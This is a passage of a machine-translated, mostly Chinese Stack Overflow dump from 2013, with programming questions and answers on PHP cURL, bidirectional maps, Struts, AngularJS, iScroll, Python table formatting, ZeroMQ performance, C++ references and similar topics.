string(267) "HTTP/1.1 200 OK 日期：2013 年 3 月 1 日星期五 14:16:57 GMT 服务器：Apache/2.4.3 (Win32) OpenSSL/1.0.1c PHP/5.4.7 X-Powered-By：PHP /5.4.7 缓存控制：无缓存 x-debug-token：5130b85a178bd 传输编码：分块内容类型：应用程序/json {"name":"manoj"}"

curl_error($ch) 的 VARDUMP

字符串（0）“”

$json_array 的 VARDUMP

空值

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T14:24:08.347

> 如果无法解码 json，则返回 NULL

您不想在 curl_exec 的正文中返回标头，因此您需要：

```
curl_setopt($ch, CURLOPT_HEADER, false) 
```

[http://php.net/manual/en/function.json-decode.php](http://php.net/manual/en/function.json-decode.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-06-06T18:07:34.160

如果出于任何原因您必须维护 CURLOPT_HEADER 选项，您可以使用以下内容：

```
$output = curl_exec($ch);  

$json_data = mb_substr($output, curl_getinfo($ch, CURLINFO_HEADER_SIZE));  
$data = json_decode($json_data); 
```

您可以使用 CURLOPT_HEADER 选项检查返回码 200、404 等...

```
$code = curl_getinfo($ch, CURLINFO_HTTP_CODE); 
```

# algorithm - 我可以使用什么结构将唯一键映射到唯一值？

> ID：15159916
> 
> 赞同：2
> 
> 时间：2013-03-01T14:20:11.493
> 
> 标签：algorithm, data-structures, collections

当键是唯一的时，Map 可以解决 O(1) 的搜索解。

但是是否存在一种结构，其中按键搜索和值搜索都采用 O(1) 顺序？

给定一个结构：

```
Put(key,value)
GetValueOf(Key) in O(1)
GetKeyOf(Value) in O(1) 
```

有没有一种方法可以在不使用 2 张地图的情况下按 1 次顺序进行两次搜索？

我对 java 实现特别感兴趣。

提前致谢 ！！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-02T19:06:48.000

您注意到，当键是唯一的时，地图可以解决 O(1) 搜索解决方案。当两个键都是唯一的任何值时，您需要一个 O(1) 搜索解决方案。那么，这个数据结构就足够了：

```
class YourDoubleHashMap<K,V>() {
  private HashMap<K,V> keyMap;
  private HashMap<V,K> valMap;

  YourDoubleHashMap<K,V>() {
    keyMap = new HashMap<K,V>();
    valMap = new HashMap<V,K>();
  }
  public boolean put(K key,V val) {
    return keyMap.put(key,val) && valMap.put(val,key);
  }
  public V getValueOfKey(K key) {
    return keyMap.get(key);
  }
  public K getKeyOfValue(V val) {
    return valMap.get(val);
  }
} 
```

这种***时间-内存权衡***方法牺牲了空间效率以换取运行时效率。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T14:31:48.937

在 boost 中有[boost::bimap](http://www.boost.org/doc/libs/1_47_0/libs/bimap/doc/html/index.html)。它基于执行两个映射的两个映射，我相信对于您遇到的问题没有更好的解决方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-01T14:33:01.477

如果您知道如何正确地“散列”值（正确地，我的意思是两个不同的值会很有可能给您两个不同的散列），您可以使用 2 个散列表，（一个从键到值，另一个从值到钥匙）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-01T14:33:43.703

boost bimap 是一种旨在满足此类要求的数据结构。它非常灵活，查找的复杂性取决于您告诉它用于存储基础值的数据结构。

[更多细节在这里](http://www.boost.org/doc/libs/1_53_0/libs/bimap/doc/html/boost_bimap/the_tutorial/controlling_collection_types.html)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-11-19T20:28:58.857

Apache commons 集合有一个[`BidiMap`](http://commons.apache.org/proper/commons-collections/javadocs/api-3.2.1/org/apache/commons/collections/BidiMap.html). 或者去谷歌的[`BiMap`](http://google-collections.googlecode.com/svn/trunk/javadoc/com/google/common/collect/BiMap.html) .

# forms - 动态形式支柱

> ID：15159917
> 
> 赞同：0
> 
> 时间：2013-03-01T14:20:14.243
> 
> 标签：forms, dynamic, struts

我是 Struts 1.3 的新手。

我需要邀请一些人参加已经发送但他们没有回答的投票。我已将这些人聚集在一个表格中，其中有一列带有复选框以再次邀请他们参加投票。此列具有动态字段，其中包含索引的 struts 标记表单字段。（不能再邀请已回答的人）

JSP视图：

```
 <logic:iterate id="respondent" collection="${respondent}">

    <logic:notEqual name="respondent" property="participation" value="true">
            <html:checkbox indexed="true" property="participation" name="respondent" value="true"></html:checkbox>
    </logic:notEqual>

    </logic:iterate> 
```

形式：

```
public class F_Invite extends org.apache.struts.action.ActionForm {

public F_Invite() {
    super();
}

private Map<String, String> respondent = new HashMap<String, String>();

public void setRespondent(String key, String value) {
    respondent.put(key, value);
}

public void setRespondent(Map<String, String> nut) {
    this.encuestado = nut;
}

public Map<String, String> getRespondent(){
    return this.encuestado;
}

public String getRespondent(String key) {
    return encuestado.get(key);
}

public void reset(ActionMapping mapping, HttpServletRequest request) {

    respondent.clear();

} 
```

在执行此操作时，我得到一个 NullPointerException：

```
 F_Invite nonparticipants = (F_Invite) form;

    Map<String, String> participantstoinvite = nonparticipants.getRespondent();

    Iterator iter = participantstoinvite.entrySet().iterator();

    while (iter.hasNext()) {

        Map.Entry entrada = (Map.Entry) iter.next();            

    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T19:44:26.670

假设其他一切都是正确的，因为所有细节都不是这里的问题，我建议你改变

`<logic:iterate id="respondent" collection="${respondent}">' to '<logic:iterate **name**="respondent" collection="${respondent}">`

您的问题并不清楚您的要求，感觉英语不是您的第一语言:)

# ios - 在将 html 字符串加载到 UIWebview 之前，如何计算它的高度？

> ID：15159922
> 
> 赞同：1
> 
> 时间：2013-03-01T14:20:24.507
> 
> 标签：ios, uiwebview

假设我有一个 HTML 字符串，我将 UIWebview 的宽度固定为 x。

有没有办法在加载 html 字符串之前**计算UIWebview 的高度？**

编辑：

甚至在创建 UIWebView 对象之前。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T14:43:14.190

不，您需要一个加载了内容的 UIWebview 来计算内容的高度。

# c# - Inheritance XmlSerializer C#

> ID：15159931
> 
> 赞同：1
> 
> 时间：2013-03-01T14:20:55.830
> 
> 标签：c#, inheritance, xmlserializer

I have these 3 classes:

```
Class Image : Asset
Class Sound : Asset
Class Video : Asset 
```

everything serializes ok but when i create this item:

```
Class Master
List<Asset> assets //property 
```

an instance of this class for example:

```
Image i = new Image();
Sound s = new Sound();
Video v = new Video();
Master m =  new Master( new List<Asset>{i,s,v} ) 
```

it does not serialize with exception "InvalidOperationException-There was an error generating the XML document" and in the innerException : {"The type MyApplication.Video was not expected. Use the XmlInclude or SoapInclude attribute to specify types that are not known statically."}

.. any idea??

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-01T14:26:58.627

Add the `XmlInclude` attribute on the `Asset` class:

```
[XmlInclude(typeof(Video))]
[XmlInclude(typeof(Sound))]
[XmlInclude(typeof(Image))]
public class Asset
{
    ...
} 
```

# verilog - SVA（SystemVerilog 断言）：$assertoff 和 $assertkill 之间的区别？

> ID：15159940
> 
> 赞同：1
> 
> 时间：2013-03-01T14:21:17.703
> 
> 标签：verilog, system-verilog, system-verilog-assertions

`$assertoff;`SystemVerilog Assertions和有什么区别`$assertkill;`？

他们似乎都停止了断言的执行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T14:21:17.703

`$assertoff`将停止断言，除了那些已经处于活动状态的断言。

断言一旦被触发就处于活动状态，并等待移动到失败或完成。`$assertoff`不会停止或终止**处于**活动状态的断言。

`$assertkill`将停止所有断言，将所有断言移至关闭状态。

来自 Cadence 帮助：

> **$assertoff**
> 暂停检查所有指定的断言，直到遇到 $asserton。一个已经在执行的断言，包括断言动作块，将继续执行。
> 
> **$assertkill**
> 停止检查当前正在执行的所有指定断言，然后暂停检查所有指定断言，直到遇到 $asserton。
> **注意：** *根据 IEEE 1800 SystemVerilog 标准，由于调度问题，$assertkill 任务对立即断言和非临时并发断言没有影响。*

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2015-04-30T11:27:06.457

$assertoff 什么都不是，但它会停止检查所有指定的断言，除非并且直到 $assert 的 sunsequent 开启。

当你处理一个断言时，它不会影响我的断言是通过还是失败。

# sql - SQL 行到列转置

> ID：15159956
> 
> 赞同：1
> 
> 时间：2013-03-01T14:21:56.843
> 
> 标签：sql, pivot

我在将列转换为行时遇到问题，透视似乎并没有以我想要显示的方式给我结果。

这是具有 n 行的示例数据模式：

```
Coulmn1      Column2
Customer     C1
Account      A1
Transaction  T1
Transaction  T2
Transaction  T3
Account      A2
Transaction  T11
Transaction  T12
Transaction  T13
Customer     C2
Account      A11
Transaction  T111
Transaction  T112
Transaction  T113
Account      A12
Transaction  T1111
Transaction  T1112
Transaction  T1113 
```

我想将其转换为以下格式

```
Customer  Account  Transaction
C1        A1       T1
C1        A1       T2
C1        A1       T3
C1        A2       T11
C1        A2       T12
C1        A2       T13
C2        A11      T111
C2        A11      T112
C2        A11      T113
C2        A12      T1111
C2        A12      T1112
C2        A12      T1113 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:31:58.557

这是您想要执行的 MySQL 版本。它使用相关的子查询来获取客户和帐户信息：

```
select t.Column1,
       (select column2 from t t2 where t2.column1 = 'Customer' and t2.id <= t.id order by t2.id desc limit 1
       ) as customer,
       (select column2 from t t2 where t2.column1 = 'Account' and t2.id <= t.id order by t2.id desc limit 1
       ) as transaction,
from t
where t.column1= 'Transaction' 
```

这假设您有一个用于对行进行排序的 id 列。如果没有，那么您需要找到一种方法来获取这样的列（id 或时间戳），因为 SQL 表本质上是无序的。

其他数据库中的逻辑类似。但是，`limit 1`语法可能是`select top 1`or`where rownum = 1`或，而不是`fetch only 1 row`。

# javascript - AngularJS - 模型更新后指令未触发

> ID：15159957
> 
> 赞同：4
> 
> 时间：2013-03-01T14:21:57.110
> 
> 标签：javascript, angularjs

我有日历应用程序。初始化后一切正常。问题是在我更改模型（月份）之后，该指令不会针对新创建的元素进行更新。

视图部分：

```
<li class="day" ng-repeat="n in [] | range:month.daysInMonth()">    
    <span class="day-number" calendar-day="{{ n }}-{{ month.format('MM-YYYY') }}">{{ n }}</span>
</li> 
```

指令：

```
directive('calendarDay', ['month', function (month) {
    return function (scope, element, attrs) {
       scope.$watch(month, function (value) {
           var currentDate = moment(attrs.calendarDay, "DD-MM-YYYY");
           element.text(currentDate.format('DD-MM-YYYY'));
       });

    };
}]); 
```

该模型`month`是在应用程序中声明的模型：

```
value('month', moment()); 
```

这是代码：http: [//jsfiddle.net/EEVGG/11/](http://jsfiddle.net/EEVGG/11/)

如您所见，代码的月份和年份部分没有变化，而应该是因为`calendar-day`属性中的值是正确的。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T14:40:16.803

您想观察范围属性“月份”的变化，而不是您在模块上定义的*月份*对象。为此，请将*watchExpression*更改为`'month'`(String)：

```
scope.$watch('month', function (value) {
    var currentDate = moment(attrs.calendarDay, "DD-MM-YYYY");
    element.text(currentDate.format('DD-MM-YYYY'));
}, true); 
```

还将观察者设置为基于对象相等性（的最后一个参数`$watch`）比较更改，因为您的月份对象将相同，只有一些属性会更改。有关此检查的更多信息[$watch 文档](http://docs.angularjs.org/api/ng.$rootScope.Scope#$watch)。

**jsfiddle**：http: [//jsfiddle.net/bmleite/EEVGG/12/](http://jsfiddle.net/bmleite/EEVGG/12/)

# javascript - 触摸事件结束时 iScroll 返回顶部

> ID：15159958
> 
> 赞同：2
> 
> 时间：2013-03-01T14:22:07.293
> 
> 标签：javascript, ios6, scroll, iscroll

我有一个 iOS 网络应用程序，它被证明在滚动方面非常困难！我解决问题的方法是使用 iScroll 4。但是，当我将手指从屏幕上移开时，滚动部分似乎又回到了原来的位置。

有人对为什么会这样以及如何解决有任何想法吗？

剧本：

```
<script>
        var myScroll;
        function loaded() {
            myScroll = new iScroll('wrapper');
        }

        document.addEventListener('touchmove', function (e) { e.preventDefault(); }, false);

        /* * * * * * * *
         *
         * Use this for high compatibility (iDevice + Android)
         *
         */
        document.addEventListener('DOMContentLoaded', function () { setTimeout(loaded, 200); }, false)

</script> 
```

的HTML：

```
<div id="wrapper"
         style="position:absolute;
         width:600px;
         overflow:auto;
         height: 500px;">

        <div id="scroll-content"
             style="position:absolute;
             width:600px;
             padding:0;
             height: 500px;">

              // The text that needs to be scrolled

        </div>
</div> 
```

更新：以下声明应通过更改 iScroll 的加载方式来修复橡皮筋效应等奇怪行为。我已经按照说明更改了加载，但是当我放手时，我仍然得到橡皮筋将滚动区域ping回顶部。

> 有时 DOMContentLoaded 有点仓促，当内容未准备好时会被触发。如果您陷入一些奇怪的行为（例如：橡皮筋效应），请尝试以下操作：

```
<script type="application/javascript" src="iscroll.js"></script>
<script type="text/javascript"> var myScroll; function loaded() {
    setTimeout(function () {        myScroll = new iScroll('wrapper');  },
 100); } window.addEventListener('load', loaded, false); </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-05T15:05:04.183

迟到的回复，但将来可能会帮助其他人。我遇到的另一个真正常见的问题是，如果你有

```
display:none; 
```

或使用 jQuery 隐藏滚动条

```
$("x").hide(); 
```

iScroll 无法正常工作，然后您必须在使滚动条可见时调用 .refresh() 方法来解决此问题。

```
setTimeout(function () { myScroll.refresh(); }, 0); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-02T10:57:39.337

好的，希望这可以节省一些时间。问题来自 iscroll 不知道可滚动区域的高度。这似乎是由于多种原因而发生的，但在我的情况下，这是由于在 DOM 加载后发生的一些 ajax 调用。

解决方案是在显示可滚动区域之前刷新 iscroll var。

```
setTimeout(function () { myScroll.refresh(); }, 0); 
```

# twitter-bootstrap - 如何使用 twitter bootstrap 创建侧边栏

> ID：15159959
> 
> 赞同：1
> 
> 时间：2013-03-01T14:22:09.110
> 
> 标签：twitter-bootstrap

我想使用 twitter bootstrap 创建一个类似于快照中的侧边导航。这里需要特别注意的是，如果标签的名称很大......它会转换为“......”而不是完全显示它并转到不同的行。如果可能的话，整个列表也必须滚动。任何人都知道如何实现它。

![在此处输入图像描述](../Images/a1b98032d0be08525aca2e983acf25e2.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-03T23:23:36.527

将类“navbaritem-ellipsis”添加到您的 LI，并将其添加到您的 CSS 文件中：

```
li.navbaritem-ellipsis {
  text-overflow: ellipsis;
  overflow: hidden;
  white-space: no-wrap;
} 
```

no-wrap 告诉浏览器不要将文本换行到下一行。省略号指示浏览器在文本太大时将“...”添加到文本的末尾。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-03-01T14:33:06.837

好吧，文档很好地描述了这一点：http: [//twitter.github.com/bootstrap/components.html#navs](http://twitter.github.com/bootstrap/components.html#navs)

我在我的一个网络应用程序上使用侧导航栏 - 基本上使用引导程序的网格布局创建两列。左边一个较小的用于您的导航栏，右边一个用于您的主要内容。这也在文档中：http: [//twitter.github.com/bootstrap/scaffolding.html#gridSystem](http://twitter.github.com/bootstrap/scaffolding.html#gridSystem)

# python - 打印python列表中的字典值

> ID：15159962
> 
> 赞同：-3
> 
> 时间：2013-03-01T14:22:15.470
> 
> 标签：python, list, dictionary, python-3.x

我正在尝试仅打印 python 列表中的 dict 值。

```
car_object = {}
    cursor = self._db.execute('SELECT IDENT, MAKE, MODEL, DISPLACEMENT, POWER, LUXURY FROM CARS')
    for row in cursor:
       objectname = 'Car_Object_'+str(row['IDENT'])
       # print (objectname)
       car_object[objectname] = Cars(ident = row['IDENT'], make = row['MAKE'], model = row['MODEL'], disp = row['DISPLACEMENT'], power = row['POWER'], luxury = row['LUXURY'])
       print(objectname, car_object[objectname])
        #print(row['IDENT'], row['MAKE'], row['MODEL'], row['DISPLACEMENT'], row['POWER'], row['LUXURY'])

       yield dict(row) 
```

所以它正在打印：

```
Car_Object_meA160 {'power': 55, 'ident': 'meA160', 'model': 'A160 CDI', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'N'}
Car_Object_meA190 {'power': 92, 'ident': 'meA190', 'model': 'A190', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'Y'}
Car_Object_meA210 {'power': 103, 'ident': 'meA210', 'model': 'A210 EVO', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'Y'} 
```

...等等我希望能够像这样打印它：

```
 IDENT         MAKE         MODEL        DISP       POWER     LUX
Car_Object_meA160     meA160       mercedes      A160 CDI     1.7          55      N
Car_Object_meA190     meA190       mercedes      A190         1.7          92      Y
Car_Object_meA210     meA210       mercedes      A210 EVO     1.7          103     Y 
```

所以我希望能够只打印值....标题以某种方式排序。是否有可能做到这一点？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T15:38:33.867

棘手的部分是对齐几个表格条目和表格标题。为此，我们首先必须找出每列中最长的条目有多长。`pad`then 可用于向给定字符串添加多个填充空格。

```
fields = ["ident", "make", "model", "disp", "power", "luxury"]
max_len = {"name": max(map(len, car_objects)) + 1}
for f in fields:
    max_len[f] = max(map(len, [f] + [str(car[f]) for car in car_objects.values()]))
pad = lambda s, f: str(s).ljust(max_len[f]) 
```

`car_objects`现在，我们可以使用`pad`上面定义的函数打印标题和几个条目。

```
print pad("", "name") + " ".join(pad(f.upper(), f) for f in fields)
for name, car in car_objects.items():
    print pad(name, "name") + " ".join(pad(car[f], f) for f in fields) 
```

假设 的元素`car_objects`是 Python 字典，这应该可以工作。如果没有，请尝试在上面的代码中`car[f]`替换为。`getattr(c, f)`

**更新：**当然，只有在实际打印之前知道所有行时，才能完美对齐表格的列。如果您必须*在仍然从数据库中读取条目的同时*打印它们，则必须“猜测”填充字符串的空格数，以便它们在表格中很好地对齐。这使一切*变得更加*简单。只需将此行放在您的`for`循环之前以打印表头：

```
print (" " * 20) + " ".join(f.upper().ljust(10) for f in fields) 
```

而这一行在你的循环中，在之前`yield`：

```
print name.ljust(20) + " ".join(str(getattr(car, f)).ljust(10) for f in fields) 
```

`str.ljust(n)`是一个标准的字符串函数，它返回在字符总宽度内左对齐的字符串`n`。右对齐和居中对齐也有类似的功能：`rjust`和`center`. 而且由于您的汽车似乎是某个类的实例，因此您可以使用内置函数`getattr(<object>, <attribute name>)`来检索汽车的各个属性（类似于您的`getVariable`方法）。

有关字符串格式的更多信息，请查看此[Python 文档页面](http://docs.python.org/3/tutorial/inputoutput.html#fancier-output-formatting)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:55:04.137

试试这个：

```
#print your header labels first                                                                                                                       
d = {'power': 55, 'ident': 'meA160', 'model': 'A160 CDI', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'N'}
# this is for each car                                                                                                                                
headers = ['ident', 'make', 'model', 'disp', 'power', 'luxury'] # change this order if you   want different order                                       
values = [d[h] for h in headers]
print("{0:12}{1:12}{2:12}{3:12}{4:12}{5:12}".format(values[0], values[1], values[2], values[3], values[4], values[5])) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T15:06:53.620

尝试以下操作...我使用字典对其进行了测试，因此我可以访问您拥有的属性为`car_object[obj][key.lower()]`. 我不能不看你的 Cars 课程，但你可能应该用类似的东西替换它`car_obj[obj].__getattribute__(key.lower())`

```
car_object = {}
car_object['Car_Object_meA160'] = {'power': 55, 'ident': 'meA160', 'model': 'A160 CDI', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'N'}
car_object['Car_Object_meA190'] = {'power': 92, 'ident': 'meA190', 'model': 'A190', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'Y'}
car_object['Car_Object_meA210'] = {'power': 103, 'ident': 'meA210', 'model': 'A210 EVO', 'disp': 1.7, 'make': 'mercedes', 'luxury': 'Y'}

keys = ['IDENT', 'MAKE', 'MODEL', 'DISP', 'POWER', 'LUXURY']
fmt ='{:>10}' * (len(keys) + 1)
print ' '*len('Car_Object_meA160'), fmt.format('', *keys)

for obj in car_object:
    print obj, fmt.format('', *([car_object[obj][key.lower()] for key in keys])) 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-03-01T15:04:56.227

是的。这是一个快速功能，它可以获取列表并打印出您想要的内容。

```
def output(cars):
    print "          IDENT        MAKE        MODEL        DISP        POWER"
    for i in cars:
        print type(i),"    ",i[ident],"   ",i[make],"   ",i[model],"   ",i[disp],"   ",i[power] 
```

它应该打印出您放置的尽可能多的汽车。虽然我对间距并不积极。

# php - 在 php while 循环中重复一个按钮

> ID：15159964
> 
> 赞同：0
> 
> 时间：2013-03-01T14:22:20.963
> 
> 标签：php, mysql, while-loop

以下是我用于显示我的数据库的标记：

```
$html = '';
$database_enquiry = tep_db_query("(relevant database enquiry in here)");
while ($database = tep_db_fetch_array($database_enquiry)){
    $html .= '<tr>';
    $html .= '      <td>'.$myV['myVariable goes here'].'</td>';
    $html .= '      <td><button id="editDriver"></button><button id="timeDriver"></button></td>';
    $html .= '</tr>';       
}

echo $html; 
```

由于某种原因，行显示在循环中，但按钮仅显示在第一行。有谁知道为什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T14:28:31.400

顾名思义，ID 对于文档应该是唯一的，您正在为每一行复制按钮 ID。

通常，如果您有重复项（尽管应该），大多数浏览器都不会大惊小怪，但在您的情况下，这似乎会引起问题。

所以，给你的按钮跨行唯一的 ID，或者使用类来看看它是否有帮助：

```
$html .= '      <td><button class="editDriver"></button><button class="timeDriver"></button></td>'; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:26:45.297

你能在按钮标签和添加类型属性之间写一些东西吗？

```
<button type="button">Something</button> 
```

[参考](http://www.w3schools.com/tags/tag_button.asp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:28:25.330

您需要修复/检查**三件事：**

*   **`id`**属性 ID 唯一。每页不应超过一个
*   **`<tr></tr>`**标签应该在**`<table></table>`**元素内。
*   也许您的查询返回单行，在这种情况下您的代码工作正常。

此外，您应该查看按钮元素的官方文档：http: **[//www.w3.org/wiki/HTML/Elements/button](http://www.w3.org/wiki/HTML/Elements/button)**

# python - 如何避免在python中使用eval进行字符串转换？

> ID：15159971
> 
> 赞同：2
> 
> 时间：2013-03-01T14:22:28.220
> 
> 标签：python, eval

我遇到了一个“eval”问题，我想听听你的建议，我知道 eval 是错误的，我希望避免它，但我不知道如何......

我有一些 python 对象存储在数据库中，它们存储为字符串，我用 eval 将它们转换为实际对象。例如，我的对象可能是一些简单的字符串，如“[2,1,3,4]”或“[[None,None],None]”——它们对应于不同类型的对象，它们不遵循一种常见的模式。我必须像现在一样将它们存储为人类可读的对象。

我的问题是在这种情况下如何避免 eval ？我不想为每个对象编写一个解析器。

如果我必须使用 eval，我该如何清理这些字符串，以免它们做任何讨厌的事情？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-01T14:23:38.087

使用[ast.literal_eval](http://docs.python.org/2/library/ast.html#ast.literal_eval)：

```
In [9]: import ast
In [10]: ast.literal_eval("[2,1,3,4]")
Out[10]: [2, 1, 3, 4] 
```

# javascript - ZeroMQ 的预期性能是多少？

> ID：15159972
> 
> 赞同：10
> 
> 时间：2013-03-01T14:22:28.967
> 
> 标签：javascript, performance, coffeescript, message-queue, zeromq

我正在涉足进程间通信；目的是让工作进程执行一些计算并将结果传递回控制进程。我安装了[zeromq.node](https://github.com/JustinTulloss/zeromq.node)并在 coffeescript 中设置了一个简单的请求者和响应者。

请求者：

```
# requester.coffee

zmq                       = require 'zmq'
context                   = new zmq.Context()
socket                    = zmq.socket 'req'

socket.bind 'tcp://127.0.0.1:5555', ( error ) =>
  throw error if error?
  console.log 'Requesting writer bound to port 5555'
  setInterval ( -> socket.send 'helo world' ), 1

response_count  = 0
t0              = new Date() / 1000

socket.on 'message', ( message ) ->
  response_count += 1
  # x = message.toString 'utf-8'
  if response_count % 1000 is 0
    t1              = new Date() / 1000
    console.log "received #{ parseInt response_count / ( t1 - t0 ) + 0.5 } messages per second"
    response_count  = 0
    t0 = new Date() / 1000 
```

响应者：

```
# responder.coffee

zmq                       = require 'zmq'
context                   = new zmq.Context()
socket                    = zmq.socket 'rep'

socket.connect 'tcp://127.0.0.1:5555'
console.log 'Responder bound to port 5555'
process.stdin.resume()

request_count   = 0
t0              = new Date() / 1000

socket.on 'message', ( message ) ->
  request_count += 1
  # message = message.toString 'utf-8'
  # console.log message
  socket.send 'helo back'
  if request_count % 1000 is 0
    t1              = new Date() / 1000
    console.log "received #{ parseInt request_count / ( t1 - t0 ) + 0.5 } messages per second"
    request_count  = 0
    t0 = new Date() / 1000 
```

现在，当我在我的 ubuntu（11.10、8GB、Intel Duo Core 3GHz、NodeJS 0.8.6）机器上的单独终端窗口中运行它们时，我得到以下输出：

```
received 135 messages per second
received 6369 messages per second
received 6849 messages per second
received 6944 messages per second
received 7042 messages per second
received 7143 messages per second
received 5952 messages per second
received 2967 messages per second
received 914 messages per second
received 912 messages per second
received 928 messages per second
received 919 messages per second
received 947 messages per second
received 906 messages per second
received 918 messages per second
received 929 messages per second
received 916 messages per second
received 917 messages per second
received 916 messages per second
received 928 messages per second 
```

其中（1）看起来有点像几秒钟后传输通道中存在某种饱和；(2) 感觉不够快。根据[这个基准](http://mikehadlow.blogspot.de/2011/04/message-queue-shootout.html)，我应该在每秒数十万而不是数千条消息中，这一点得到了[这个讨论](https://stackoverflow.com/questions/7921324/performance-comparison-between-zeromq-rabbitmq-and-apache-qpid)的证实（“ZeroMQ：接收 10,000 条消息需要大约 15 毫秒”）。

我还尝试使用用 python 3 编写的响应器并得到完全相同的数字。更重要的是，我编写了一对替代脚本，主进程将生成一个子进程并通过标准输出/标准输入与它进行通信；我每秒获得大约 750 条消息（当我增加消息长度时，我看不到太大的差异），这与 zeromq 实验的大致相同。

这些数字是预期的吗？这里的限制因素是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-05-06T23:06:44.003

我认为有两件事正在发生。首先，你有`setInterval ( -> socket.send 'helo world' ), 1`. 这每毫秒发送一个请求，因此您将被限制为每秒 1000 个请求。

此外，请求/响应模型是同步的。请求进入套接字并阻塞，直到给出响应。有了响应，下一个请求就被处理和阻塞了。

我将请求者脚本从`socket = zmq.socket 'req'`to`socket = zmq.socket 'push'`和`setInterval ( -> socket.send 'helo world' ), 0`to更改为`socket.send 'helo world' while true`. 然后我将响应脚本更改`socket = zmq.socket 'rep'`为`socket = zmq.socket 'pull'`并得到了这个输出

```
$ coffee responder.coffee
Responder bound to port 5555
received 282 messages per second
received 333357 messages per second
received 249988 messages per second
received 333331 messages per second
received 250003 messages per second
received 333331 messages per second
received 333331 messages per second
received 333331 messages per second
... 
```

请求者没有得到输出，因为它阻塞了 while 循环，但它确实证明了 ØMQ 可以获得更好的性能。

# c++ - 通过引用返回

> ID：15159978
> 
> 赞同：-4
> 
> 时间：2013-03-01T14:22:57.173
> 
> 标签：c++

抱歉，如果问题非常基本。

方案 1：

```
#include <iostream>
using namespace std;

int   max(int &a)
{
   a +=100;
   return a;
}

int main ( int argc, char ** argv)
{

  int x=20;
  int y;
  y = max(x);
  cout <<"x , y value is  "<<x<<"and"<<y<<endl;
 } 
```

**输出：**

x,y 值为 120 和 120

方案 2：

```
#include <iostream>
using namespace std;

int & max(int &a)
{
   a +=100;
   return a;
}

int main ( int argc, char ** argv)
{

  int x=20;
  int y;
  y = max(x);
  cout <<"x , y value is  "<<x<<"and"<<y<<endl;
 } 
```

**输出：**

x,y 值为 120 和 120

PROGRAM1 和 PROGRAM2 之间的唯一区别是第二个程序通过引用返回。究竟有什么区别？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T14:31:32.880

`PROGRAM1`: 返回时复制引用的变量 a，
`PROGRAM2`: 返回对被引用变量本身的引用（实际上是相同的引用？）。

输出不会有*任何差异，*因为无论哪种方式，该值都被复制到变量“y”。

但是， The`PROGRAM1`执行的*复制操作*比`PROGRAM2`.

**当您喜欢时会出现**问题：****

 **```
int&  max(int a) // a is  value variable
{
   a +=100;
   int &a1 = a
   return a1;  // you are returning reference to  local 
} 
```

在此版本中，`max()`变量**`a`**范围是 max() 本地的，如果您返回对**`a`**. 然后堆栈分配的我会消失，你什么都没有提到。错误的！

在这里阅读更多[解释](https://stackoverflow.com/questions/752658/is-the-practice-of-returning-a-c-reference-variable-evil)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T14:43:05.540

据我所知，这两个程序完全一样。您没有复制正确的代码吗？通常，当您通过引用传递变量时，您正在对原始变量进行更改。当您按值传递它时，您传递的是变量的副本。这意味着，如果您通过引用传递变量并对其进行更改，则原始变量也会更改。按值传递时并非如此。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T14:31:32.977

据我了解，按值返回会创建一个新变量，按引用返回会返回对原始变量的引用，从而节省内存分配。

对于整数，差异可能是学术性的，因为引用将占用与值整数相同的内存空间。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-01T14:28:21.743

这两个程序没有问题。仅当您通过引用返回函数的局部变量时才会出现此问题。这是因为该引用将在函数结束时消失。但是当你使用`a`它时，它仍然会在函数调用之后在作用域内。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-01T14:35:28.913

如果您返回一个局部变量的值，则第二个将不正确。但是这些变体之间的区别只是第二个中的函数*max*返回在其中修改的原始对象。第一个呢 - 它在修改后返回原始值的副本。

*因此，如果您使用另一种充满字段而不是 int 的大型类型，则最好使用第二种。*

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-01T14:36:11.983

你的两个程序的唯一区别是值`x`被复制`x`到另一个地方[在实际代码中，它可能根本没有任何区别，因为编译器优化掉了“不必要的”副本] .

